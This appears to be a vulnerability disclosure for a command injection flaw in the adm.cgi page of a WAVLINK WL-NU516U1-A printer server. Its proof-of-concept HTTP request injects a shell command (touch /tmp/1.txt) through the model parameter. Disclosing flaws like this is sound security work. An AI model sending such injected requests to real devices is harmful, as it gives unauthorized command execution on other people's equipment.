## WAVLINK WL-NU516U1-A USB Printer Server

Firmware Version: M16U1_V240425

Vulnerability Type: Command Injection

### Overview

A command injection vulnerability has been discovered in the WAVLINK WL-NU516U1-A USB Printer Server. The vulnerability lies in the `adm.cgi` module. When the `page` parameter is set to `ota_new_upgrade`, command execution can be achieved by constructing parameters such as `model` and `brand`.

### Vulnerability Details

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-14-16-21-09-image.png)

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-14-16-20-48-3bb4c631-9b1e-4c2e-89b8-ae0600d19ea4.png)

### poc

```http
POST /cgi-bin/adm.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/html/user_login.shtml
Cookie: language=sc; session=1227460431
Upgrade-Insecure-Requests: 1
Priority: u=0, i

page=ota_new_upgrade&brand=admin&model=1";touch /tmp/1.txt;#"&version=admin111&firmware_url=11&md5=111
```

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-14-16-26-48-image.png)
